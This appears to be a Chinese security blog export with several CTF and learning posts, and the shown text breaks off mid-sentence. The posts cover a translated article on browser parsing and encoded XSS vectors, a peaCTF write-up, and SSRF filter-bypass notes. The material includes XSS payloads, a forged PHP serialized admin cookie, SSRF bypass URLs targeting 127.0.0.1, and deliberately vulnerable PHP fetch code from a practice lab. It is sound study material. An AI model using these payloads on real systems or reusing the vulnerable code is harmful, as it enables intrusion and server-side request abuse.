得到flag： FLAG{Redis without authentication is easy to exploit}小结XSS真是太强大了，看飘零大佬和N0rth3ty大佬的文章弄了整整一天才弄懂，收货颇丰！ 参考链接： http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/#%E5%89%8D%E8%A8%80 https://www.anquanke.com/post/id/156377#h3-2 https://www.runoob.com/redis/redis-security.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[浏览器解析机制与XSS向量编码]]></title>
    <url>%2F2019%2F07%2F24%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8EXSS%E5%90%91%E9%87%8F%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[今天在看让人头大的XSS的时候，看到一篇大佬写的文章，讲的是HTML、URL与JavaScript的解析规则，一下来了兴趣，以前做XSS练习的时候，看wp用各种标签和各种编码，真是越学越懵….. 本文转载自：http://bobao.360.cn/learning/detail/292.html 这篇文章将要深入理解HTML、URL和JavaScript的规范细则和解析器，以及在解析一段XSS脚本时他们之间有着怎样的差别。这些内容对读者的难易程度取决于读者对HTML规范和浏览器解析的知识是否充足。当然，我向您保证这篇文章比较长，因此请准备一小时或两小时来从中获益。在主题开始之前，请花费一点时间来看看下列语句并尝试回答：这些脚本能够正确执行吗？ 基础部分 1.&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; URL 编码 &quot;javascript:alert(1)&quot; 2.&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt; HTML字符实体编码 &quot;javascript&quot; 和 URL 编码 &quot;alert(2)&quot; 3.&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt; URL 编码 &quot;:&quot; 4.&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; HTML字符实体编码 &lt; 和 &gt; 5.&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; HTML字符实体编码 &lt; 和 &gt; 6.&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;高级部分 1.&lt;button onclick=&quot;confirm(&apos;7&amp;#39;);&quot;&gt;Button&lt;/button&gt; HTML字符实体编码 &quot; &apos; &quot; （单引号） 2.&lt;button onclick=&quot;confirm(&apos;8\u0027);&quot;&gt;Button&lt;/button&gt; Unicode编码 &quot; &apos; &quot; （单引号） 3.&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt; HTML字符实体编码 alert(9); 4.&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt; Unicode 编码 alert 5.&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt; Unicode 编码 alert(11) 6.&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt; Unicode 编码 alert 和 12 7.&lt;script&gt;alert(&apos;13\u0027)&lt;/script&gt; Unicode 编码 &quot; &apos; &quot; （单引号） 8.&lt;script&gt;alert(&apos;14\u000a&apos;)&lt;/script&gt; Unicode 编码换行符（0x0A）额外赠送 &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt;在解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析。每个解析器负责解码和解析HTML文档中它所对应的部分，其工作原理已经在相应的解析器规范中明确写明。 0x01.HTML解析从XSS的角度来说，我们感兴趣的是HTML文档是如何被词法解析的，因为我们并不想让用户提供的数据最终被解析为一段可执行脚本的script标签。HTML词法解析细则在这里。HTML词法解析细则是一篇冗长的文档，这篇博文并不会覆盖它的所有内容。这篇博文只会覆盖有关文档解码如何结束，以及新token何时被创建这两个有趣的部分。 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;’符号（后面没有跟’/‘符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 （译者注：词法解析是《编译原理》所涉及的内容，学习过编译原理的读者可以更好的理解“状态机”的工作原理）。 这里有三种情况可以容纳字符实体，数据状态中的字符引用，RCDATA状态中的字符引用和属性值状态中的字符引用。在这些状态中HTML字符实体将会从&amp;#...形式解码，对应的解码字符会被放入数据缓冲区中。例如，在问题4中，&lt;和&gt;字符被编码为&amp;#60;和&amp;#62;。当解析器解析完&lt;div&gt;并处于数据状态时，这两个字符将会被解析。当解析器遇到&amp;字符，它会知道这是数据状态的字符引用，因此会消耗一个字符引用（例如&amp;#60;）并释放出对应字符的token。在这个例子中，对应字符指的是&lt;和&gt;。读者可能会想：这是不是意味着&lt;和&gt;的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到标签开始状态。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成数据。 （译者注：这里要解释几个概念） 字符实体(character entities) 字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开始，后面跟着一个预定义的实体的名称，或是一个#符号以及字符的十进制数字。 HTML字符实体(HTML character entities) 在HTML中，某些字符是预留的。例如在HTML中不能使用&lt;或&gt;，这是因为浏览器可能误认为它们是标签的开始或结束。如果希望正确地显示预留字符，就需要在HTML中使用对应的字符实体。一个HTML字符实体描述如下： http://p9.qhimg.com/t0171d5ca6fbb87488f.png 需要注意的是，某些字符没有实体名称，但可以有实体编号。 字符引用（character references） 字符引用包括字符值引用和字符实体引用。在上述HTML例子中，&lt;对应的字符值引用为&amp;#60;，对应的字符实体引用为&amp;lt;。字符实体引用也被叫做实体引用或实体。） 现在你大概会明白为什么我们要转义&lt;、&gt;、&#39; (单引号)和&quot; (双引号)字符了。但为什么我们还要转义&amp;呢？大概 &amp; 是无辜的，任何跟在“&amp;”后面的内容仅会被解释为字符引用，这并不会开始或闭合一个标签。事实上，&amp;字符并不会打断HTML级别的转义过程，但它可能会打断其他级别的转义过程。我们将在JavaScript解析的部分讨论这个问题。 这里要提一下RCDATA的概念。要了解什么是RCDATA，我们先要了解另一个概念。在HTML中有五类元素： 空元素(Void elements)，如&lt;area&gt;,&lt;br&gt;,&lt;base&gt;等等 原始文本元素(Raw text elements)，有&lt;script&gt;和&lt;style&gt; RCDATA元素(RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt; 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素 基本元素(Normal elements)，即除了以上4种元素以外的元素 五类元素的区别如下： 空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 原始文本元素，可以容纳文本。 RCDATA元素，可以容纳文本和字符引用。 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释 基本元素，可以容纳文本、字符引用、其他元素和注释 如果我们回头看HTML解析器的规则，其中有一种可以容纳字符引用的情况是RCDATA状态中的字符引用。这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被HTML解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入标签开始状态。这样就可以解释问题5了。另外，对RCDATA有个特殊的情况。在浏览器解析RCDATA元素的过程中，解析器会进入RCDATA状态。在这个状态中，如果遇到&lt;字符，它会转换到RCDATA小于号状态。如果&lt;字符后没有紧跟着/和对应的标签名，解析器会转换回RCDATA状态。这意味着在RCDATA元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是&lt;/textarea&gt;或者&lt;/title&gt;。当然，这要看开始标签是哪一个。因此，在&lt;textarea&gt;和&lt;title&gt;的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题6中的脚本不会被执行。 我们来迅速看一下CDATA元素。任何在CDATA元素中的内容将不会触发解析器创建开始标签。闭合CDATA元素的标志是]]&gt;序列。因此如果用户想逃出CDATA元素，就要用未经任何编码的]]&gt;序列，不然是不会逃出CDATA元素的。 0x02.URL解析URL解析器也是一个状态机模型，从输入流中进来的字符可以引导URL解析器转换到不同的状态。解析器的解析细则在这里。其中有很多有关安全或XSS转义的内容。 首先，URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。例如，你不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型。这就是为什么问题1中的代码不能被执行。因为URL中被编码的javascript没有被解码，因此不会被URL解析器识别。该原则对协议后面的：（冒号）同样适用，即问题3也得到解答。然而，你可能会想到：为什么问题2中的脚本被执行了呢？如果你记得我们在HTML解析部分讨论的内容的话，是否还记得有一个情况叫做“属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML解析器解析了文档，创建了标签token，并且对href属性里的字符实体进行了解码。然后，当HTML解析器工作完成后，URL解析器开始解析href属性值里的链接。在这时，javascript协议已经被解码，它能够被URL解析器正确识别。然后URL解析器继续解析链接剩下的部分。由于是javascript协议，JavaScript解析器开始工作并执行这段代码，这就是为什么问题2中的代码能够被执行。 其次，URL编码过程使用UTF-8编码类型来编码每一个字符。如果你尝试着将URL链接做了其他编码类型的编码，URL解析器就可能不会正确识别。 0x03.JavaScript 解析JavaScript解析过程与HTML解析过程有点不一样。JavaScript语言是一门内容无关语言。对应着有一份内容无关的语法来描述它。我们可以利用内容无关语法来解释JavaScript是如何解析的。ECMAScript-262细则在这里，语法文件在这里。 这里有一些与安全相关的事情：字符是如何被解码的？对一些字符进行转义是否有效？ 开始之前，让我们来回到HTML解析过程中的“原始文本”元素。我故意将HTML中的一部分留到这个章节是因为它与JavaScript解析有关。所有的script块都属于原始文本元素。script块有个有趣的属性：在块中的字符引用并不会被解析和解码。如果你去看“脚本数据状态”的状态转换规则，就会发现没有任何规则能转移到字符引用状态。这意味着什么？这意味着问题9中的脚本并不会执行。所以如果攻击者尝试着将输入数据编码成字符实体并将其放在script块中，它将不会被执行。 那像\uXXXX（例如\u0000,\u000A）这样的字符呢，JavaScript会解析这些字符来执行吗？简单的说：视情况而定。具体的说就是要看被编码的序列到底是哪部分。首先，像\uXXXX一样的字符被称作Unicode转义序列。从上下文来看，你可以将转义序列放在3个部分：字符串中，标识符名称中和控制字符中。 字符串中：当Unicode转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在ECMAScript中。因此，Unicode转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。 ECMA-262 5.1版 6章 6节 “ECMAScript 与 JAVA 编程语言在对待Unicode转义序列时的行为不同。在Java程序中，如果Unicode转义序列\u000A出现在单行字符串注释中，它会被解释为行结束符（换行符），因此会导致接下来的Unicode字符不是注释的一部分。同样的，如果Unicode转义序列\u000A出现在Java程序的字符串常量中，它同样会被解释为行结束符（换行符），这在字符串常量中是不被允许的——如果需要在字符串常量中表示换行，需要用\n来代替\u000A。在ECMAScript程序中，出现在注释中的Unicode转义序列永远不会被解释，因此不会导致注释换行问题。同样地，ECMAScript程序中，在字符串常量中出现的Unicode转义序列会被当作字符串常量中的一个Unicode字符，并且不会被解释成有可能结束字符串常量的换行符或者引号。” 标识符名称中：当Unicode转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。这可以用来解释问题10。如果我们深入研究JavaScript细则，可以看到如下内容： “Unicode转义序列（如\u000A\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’&#39;符号前置在Unicode转义序列串（如\u000A000B000C）并不能作为标识符名称中的字符。将Unicode转义序列串放在标识符名称中是非法的。” 控制字符:当用Unicode转义序列来表示一个控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。如果你去看ECMAScript的语法，就会发现没有一处会用Unicode转义序列来当作控制字符。例如，如果解析器正在解析一个函数调用语句，圆括号部分必须为“(”和“)”，而不能是\u0028和\u0029。 总的来说，Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。如果我们回看问题11，它并不会被执行。因为“(11)”不会被正确的解析，而“alert(11)”也不是一个有效的标识符名称。问题12不会被正确执行要么是因为’\u0031\u0032’不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是ASCII型数字。问题13不会执行的原因是’\u0027’仅仅会被解释成单引号文本，而此时字符串是未闭合的。问题14能够执行的原因是’\u000a’会被解释成换行符文本，这并不会导致真正的换行从而引发JavaScript语法错误。 0x04.解析流在讨论过HTML，URL和JavaScript解析之后，读者应该能够对“什么会被解码”、“在什么地方被解码”和“如何被解码”这几件事有了清楚的认识。现在，另一个重要的概念是所有这些是如何协同工作的？在网页中有很多地方需要多个解析器来协同工作。因此，对于解码和转义问题，我们将简要的讨论浏览器如何解析一篇文档。 当浏览器从网络堆栈中获得一段内容后，触发HTML解析器来对这篇文档进行词法解析。在这一步中字符引用被解码。在词法解析完成后，DOM树就被创建好了，JavaScript解析器会介入来对内联脚本进行解析。在这一步中Unicode转义序列和Hex转义序列被解码。同时，如果浏览器遇到需要URL的上下文，URL解析器也会介入来解码URL内容。在这一步中URL解码操作被完成。由于URL位置不同，URL解析器可能会在JavaScript解析器之前或之后进行解析。考虑如下两种情况 Example A: &lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt; Example B: &lt;a href=# onclick=&quot;window.open(&apos;UserInput&apos;)&quot;&gt;&lt;/a&gt;在例A中，HTML解析器将首先开始工作，并对UserInput中的字符引用进行解码。然后URL解析器开始对href值进行URL解码。最后，如果URL资源类型是JavaScript，那么JavaScript解析器会进行Unicode转义序列和Hex转义序列的解码。再之后，解码的脚本会被执行。因此，这里涉及三轮解码，顺序是HTML，URL和JavaScript。 在例B中，HTML解析器首先工作。然而接下来，JavaScript解析器开始解析在onclick事件处理器中的值。这是因为在onclick事件处理器中是script的上下文。当这段JavaScript被解析并被执行的时候，它执行的是“window.open()”操作，其中的参数是URL的上下文。在此时，URL解析器开始对UserInput进行URL解码并把结果回传给JavaScript引擎。因此这里一共涉及三轮解码，顺序是HTML，JavaScript和URL。 有没有可能解码次数超过3轮呢？考虑一下这个例子 Example C: &lt;a href=&quot;javascript:window.open(&apos;UserInput&apos;)&quot;&gt;例C与例A很像，但不同的是在UserInput前多了window.open()操作。因此，对UserInput多了一次额外的URL解码操作。总的来说，四轮解码操作被完成，顺序是HTML，URL，JavaScript和URL。 此时此刻，读者应该已经获得解答博文开始提到的所有问题的必要知识。如果你有任何的问题，欢迎留言讨论。 0x05.总结简而言之，作为攻击者为了弄明白如何让XSS向量逃逸出上下文，或者为了使你的应用能够正确编码用户的输入，你必须真正明白浏览器的解析原理以及它们（HTML，URL和JavaScript解析器）是如何协同工作的。只有这样，你才能从浏览器的角度去正确编码你的向量。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[peaCTF wp]]></title>
    <url>%2F2019%2F07%2F23%2Fpeactf%2F</url>
    <content type="text"><![CDATA[不得不说，现在的初高中生太强了。。。 部分wp如下 Breakfast(Points:50)题目描述： Mmm I ate some nice bacon and eggs this morning. Find out what else I had for an easy flag. Don’t forget to capitalize CTF! Ciphertext 附加内容： 011100010000000000101001000101{00100001100011010100000000010100101010100010010001}题目提到了bacon，则猜测培根加密，将0转换为A，1转换为B，在http://rumkin.com/tools/cipher/baconian.php进行转换，注意要选择选项I=J and U=V，不正确可以交换A和BSwap A and B，还有就是注意flag格式，flag：peaCTF{eggwaffles} 1234567891011str1 = '011100010000000000101001000101&#123;00100001100011010100000000010100101010100010010001&#125;'decode1 = ''for i in str1: if i == '0': decode1 += 'B' elif i == '1': decode1 += 'A' else: decode1 += ' 'print(decode1) Broken Keyboard(Points:50)题目描述： Help! My keyboard only types numbers! Ciphertext 附加内容： 112 101 97 67 84 70 123 52 115 99 49 49 105 115 99 48 48 108 125ascii to str，flag：peaCTF{4sc11isc00l} Choose your Pokemon(Points:150)题目描述： Just a simple type of recursive function. master-ball 附加文件无后缀，用010editor打开，看到了头部有Rar，则直接formost，得到一个zip文件，解压后又是一个无后缀文件，再formost，得到一个pdf文件，打开后有一个网址https://pastebin.com/AWTDEb9j，访问，看到有一堆代码(太多了，粘一小部分)： {\rtf1\adeflang1025\ansi\ansicpg1252\uc1\adeff31507\deff0\stshfdbch31505\stshfloch31506\stshfhich31506\stshfbi31507\deflang1033\deflangfe1041\themelang1033\themelangfe0\themelangcs0{\fonttbl{\f0\fbidi \froman\fcharset0\fprq2{\*\panose 02020603050405020304}Times New Roman;}{\f34\fbidi \froman\fcharset0\fprq2{\*\panose 02040503050406030204}Cambria Math;} {\f37\fbidi \fswiss\fcharset0\fprq2{\*\panose 020f0502020204030204}Calibri;}{\f43\fbidi \froman\fcharset128\fprq2{\*\panose 02020400000000000000}Yu Mincho{\*\falt \&apos;9f\&apos;e0\&apos;96\&apos;be\&apos;92\&apos;a9};}{\f45\fbidi \froman\fcharset128\fprq2 @Yu Mincho;}复制前两行搜索，了解到这是rtf格式的内容： RTF是Rich Text Format的缩写，意即多文本格式。这是一种类似DOC格式（Word文档）的文件，有很好的兼容性，使用Windows“附件”中的“写字板”就能打开并进行编辑。使用“写字板”打开一个RTF格式文件时，将看到文件的内容；如果要查看RTF格式文件的源代码，只要使用“记事本”将它打开就行了。这就是说，你完全可以像编辑HTML文件一样，使用“记事本”来编辑RTF格式文件。 则将所有内容clone下来，后缀改为.rtf，用word打开得到flag：flag{wild_type} Educated Guess(Points:600)题目描述： There is a secured system running at http://shell1.2019.peactf.com:55567/query.php. You have obtained the source code Hints: Good programmers follow naming conventions. 直接访问网址，显示Not logged in.，把source code下载下来： &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Secured System&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php // https://www.php-fig.org/psr/psr-4/ function autoload($class) { include $class . &apos;.class.php&apos;; } spl_autoload_register(&apos;autoload&apos;); if (!empty($_COOKIE[&apos;user&apos;])) { $user = unserialize($_COOKIE[&apos;user&apos;]); if ($user-&gt;is_admin()) { echo file_get_contents(&apos;../flag&apos;); } else { http_response_code(403); echo &quot;Permission Denied&quot;; } } else { echo &quot;Not logged in.&quot;; } ?&gt; &lt;/body&gt; &lt;/html&gt;有些函数是第一次见到： 1.__autoload — 尝试加载未定义的类；使用这个函数的基本条件是类文件的文件名要和类名字保持一致 当程序用到某个类时，如果之前没有引入这个类，就会自动执行该函数，函数会根据类名称来查找类文件的路径 2.spl_autoload_register — 注册给定的函数作为 __autoload 的实现 source code中有个注释的链接，讲的是PHP PSR-4自动加载，PSR就是PHP Standards Recommendation的简称，即PHP代码规范，实在看不懂就在网上找了一个中文版的https://segmentfault.com/a/1190000002521658 代码中，$_COOKIE[‘user’]参数是可控的，但反序列化类能成功的条件是文件中已存在该类，代码通过include $class . &#39;.class.php&#39;;的方式把类包含进来，关键就是要知道类名是什么了 比较坑的是，这道题要靠猜来做(Educated Guess)，比较走运的是，我猜了两次就猜对了23333，发现了类文件路径： http://shell1.2019.peactf.com:55567/User.class.php之后就要构造序列化了，因为文件名知道了，那么类名也就知道了是User，关键是代码有个判断语句if ($user-&gt;is_admin())，可以知道类中定义了一个is_admin方法，该方法会通过某标志判断你是不是admin，那么关键得知道这个标志，即属性名是什么 又要猜测了…把user、root、is_admin、admin依次不断更换大小写尝试(哭)，最终试出来属性字段是admin 猜测User.class.php的内容大概为： class User { public $admin; public function is_admin() { if($this-&gt;$admin === 1){ return TRUE; } else{ return FALSE; } } }构造序列化： $a = new User(); $a-&gt;admin = 1; echo serialize($a);payload： user=O:4:&quot;User&quot;:1:{s:5:&quot;admin&quot;%3bi:1%3b};放到Cookie中，发包即可看到flag：flag{peactf_follow_conventions_9b778fab2e0ed7d6590c51e799589392} School(Points:100)题目描述： My regular teacher was out sick so we had a substitute today. Ciphertext 附加内容： Alphabet: ​WCGPSUHRAQYKFDLZOJNXMVEBTIzswGXU{ljwdhsqmags}看到substitude和Alphabet，就想到了单表代替密码，数了一下字母，发现正好前面有26个大写字母，那么后面的应该为密文，替换表为： A B C D E F G H I J K L M N O P Q R S T U V W X Y Z W C G P S U H R A Q Y K F D L Z O J N X M V E B T I得到密文对应的明文为： zswGXU{ljwdhsqmags} peaCTF{orangejuice}Coffee Time(Points:250)题目描述： Run this jar executable in a virtual machine and see what happens. coffeetime.jar 下载附件后打不开，重新配了java环境也不行，那么就查看程序源码，先用formost分离，之后反编译CoffeeTime.class这个文件，直接看到了flag： if(line.equals(result.toString())) { if(System.currentTimeMillis() &gt; timeend + (long)secs) System.out.println(&quot;Uh-oh, time&apos;s out.&quot;); else System.out.println(&quot;peaCTF{nice_cup_of_coffee}&quot;); } else { System.out.println(&quot;Wrong answer, unfortunately.&quot;); }]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ssrf学习(二)]]></title>
    <url>%2F2019%2F07%2F21%2Fssrf%E5%AD%A6%E4%B9%A0-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[学习绕过ssrf限制的一些姿势 Advanced 1 题目部分源码如下： 12345678$handler = $_POST["handler"];if (preg_match('#^https?://#i', $handler) !== 1) &#123; echo "Wrong scheme! You can only use http or https!"; die();&#125; else if(preg_match('#^https?://10.0.0.3#i', $handler) === 1) &#123; echo "Restricted area!"; die();&#125; preg_math()里面的#是模式分隔符，与/相同，这篇回答写的很清楚：https://zhidao.baidu.com/question/519454919.html 但为了方便在本地进行测试，将源码ip改为本机ip 12345678$handler = $_POST["handler"];if (preg_match('#^https?://#i', $handler) !== 1) &#123; echo "Wrong scheme! You can only use http or https!"; die();&#125; else if(preg_match('#^https?://127.0.0.1#i', $handler) === 1) &#123; echo "Restricted area!"; die();&#125; 0x01.利用ip格式过滤了常用的点分十进制的ip格式，但是可以其他格式绕过： 点分十进制: 127.0.0.1 2进制: 01111111.00000000.00000000.00000001 16进制: 7f.00.00.01（http://0x7f000001） 10进制： 2130706433 工具 https://www.ipaddressguide.com/ip 8进制： 0177.0000.0000.0001在线转换工具： http://tool.oschina.net/hexconvert/ 上述格式只有http://0x7f000001在本机上实验成功了，其他的都是400 bad request…，可能是环境导致的 0x02.利用URL解析URL结构： scheme://user:pass@host:port/path?query=value#fragment如，访问需要登录的ftp服务时，可以直接指定用户名和密码： ftp://user:pass@ctf.dropsec.xyz这个@符号后面的就是要访问的host，请求上述URL，得到抓包数据： GET ftp://user:pass@ctf.dropsec.xyz/ HTTP/1.1 Host: ctf.dropsec.xyz则可以构造类似： http://abced@127.0.0.1形式的URL，curl实际请求的是http://127.0.0.1 0x03.利用URL重定向关于重定向，这篇文章讲述的很好 如果服务器对URL和host均进行了检测过滤，可以通过生成短网址的方式绕过，如，利用短网址生产工具https://tinyurl.com/ ，将http://127.0.0.1转换后，访问生成的网址https://tinyurl.com/30j9，它会重定向到http://127.0.0.1 0x04.利用DNS泛域名解析这篇文章提到：DNS的泛域名解析也可以理解为带通配符的解析记录，带通配符的解析记录是用来为不存在的子域提供解析请求响应的方法。 例如：存在一个域example.com,如果我们设置通配符记录*.example.com，对所有example.com域中不存在的子域，例如：abcd.example.com、efgh.example.com的请求都会指向example.com。 可以借助xip.io和xip.name这两个DNS泛域名进行绕过，例如： http://abcd.127.0.0.1.xip.io http://abcd.127.0.0.1.xip.name 参考文章：https://www.freebuf.com/articles/web/135342.htmlhttps://mp.weixin.qq.com/s/bjjChubAvo8iOUYYU78uawhttps://mp.weixin.qq.com/s/FXInesMfXaz1l9DibxmMKw]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ssrf学习(一)]]></title>
    <url>%2F2019%2F07%2F18%2Fssrf%E5%AD%A6%E4%B9%A0-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[ssrf，即服务端请求伪造，产生的原因是告诉服务器一个网址，服务器没有进行判断、过滤，而直接去请求这个网址 图片来自：https://www.cnblogs.com/p0pl4r/p/10336501.html 练习环境地址：https://github.com/m6a-UdS/ssrf-lab 把练习环境git下来后，还要配置php.ini，因为不设置的话curl相关函数默认是不能使用的，设置好extension_dir，目录下如果没有curl.so需要apt-get php5.6-curl，将php_curl.dll前的分号删掉，并把后缀dll改为so，最后重启服务即可 相关实现函数0x01.curl实现第一关有一个输入框，可以输入网址，点击TEST IT后下方会显示获取的内容，直接输入http://127.0.0.1，下方会显示获取的这个网页的内容；进行抓包，获取的请求信息如下： POST /ssrf/testhook.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 30 Connection: keep-alive Referer: http://127.0.0.1/ssrf/ handler=http%3A%2F%2F127.0.0.1handler字段即为输入的内容，目标文件是testhook.php，查看这个文件的源码： 123456789101112131415161718&lt;?php // create curl resource $ch = curl_init(); // set url curl_setopt($ch, CURLOPT_URL, $_POST["handler"]); //return the transfer as a string curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // $output contains the output string $output = curl_exec($ch); // close curl resource to free up system resources curl_close($ch); echo $output;?&gt; 代码中各函数作用： 1.curl_init() ：初始化cURL会话，返回cURL句柄，供curl_setopt()、curl_exec()和curl_close()函数使用 2.curl_setopt() ：设置cURL传输选项，语法： curl_setopt ( resource $ch , int $option , mixed $value ) : bool参数： ch：由 curl_init() 返回的 cURL 句柄。 option：需要设置的CURLOPT_XXX选项。 CURLOPT_URL：需要获取的 URL 地址，也可以在curl_init() 初始化会话的时候。 CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以字符串返回，而不是直接输出。 value：将设置在option选项上的值。 3.curl_exec() ：执行给定的cURL会话，成功返回TRUE，失败返回FALSE；当设置CURLOPT_RETURNTRANSFER选项时，执行成功返回执行结果，失败返回FALSE 4.curl_close() ：关闭cURL会话并且释放所有资源 0x02.file_get_contents()实现123&lt;?php$a = file_get_contents($_GET['url']);echo $a; fsockopen()实现123456789101112131415161718192021&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo "$errstr (error number $errno) \n"; &#125; else &#123; $out = "GET $link HTTP/1.1\r\n"; $out .= "Host: $host\r\n"; $out .= "Connection: Close\r\n\r\n"; $out .= "\r\n"; fwrite($fp, $out); $contents=''; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; fsockopen() : 初始化一个套接字连接到指定主机;fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用 url scheme可以通过curl -V来查看curl支持的协议 └─(17:20:57)──&gt; curl -V curl 7.58.0 (x86_64-pc-linux-gnu) libcurl/7.58.0 OpenSSL/1.1.1 zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 (+libidn2/2.0.4) nghttp2/1.30.0 librtmp/2.3 Release-Date: 2018-01-24 Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP HTTP2 UnixSockets HTTPS-proxy PSL 可以看到：Protocols: dict 